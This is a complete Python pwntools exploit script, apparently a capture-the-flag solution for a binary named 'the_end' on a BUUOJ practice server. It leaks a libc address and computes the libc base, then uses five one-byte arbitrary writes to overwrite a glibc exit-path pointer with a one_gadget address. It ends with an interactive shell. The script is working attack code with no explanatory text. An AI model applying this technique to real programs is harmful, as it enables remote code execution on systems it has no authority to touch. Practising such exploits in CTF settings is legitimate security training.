#coding:utf-8
import sys
from pwn import *
context.log_level='debug'
elfelf='./the_end'
#context.arch='amd64'
while True :
	# try :
		if len(sys.argv)==1 :
			io=process(elfelf)
			# io=process(['./'],env={'LD_PRELOAD':'./'})
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			pop_rdx_rsi=0x00000000001306d9 #: pop rdx ; pop rsi ; ret
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]
		else :
			io=remote('node3.buuoj.cn',27517)
			elf=ELF(elfelf)
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			ld = ELF('/lib/x86_64-linux-gnu/ld-2.27.so')
			one_gadget = [0x4f2c5,0x4f322,0x10a38c]


		io.recvuntil('0x')
		libc_base=int(io.recv(12),16)-libc.sym['sleep']
		libc.address=libc_base
		bin_sh_addr=libc.search('/bin/sh\x00').next()
		system_addr=libc.sym['system']
		addr=libc_base+0x619F68
		one=one_gadget[1]+libc_base
		for i in range(5):
			io.send(p64(addr+i))
			sleep(0.5)
			io.send(p64(one)[i:i+1])
		# success('heap_base:'+hex(heap_base))
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue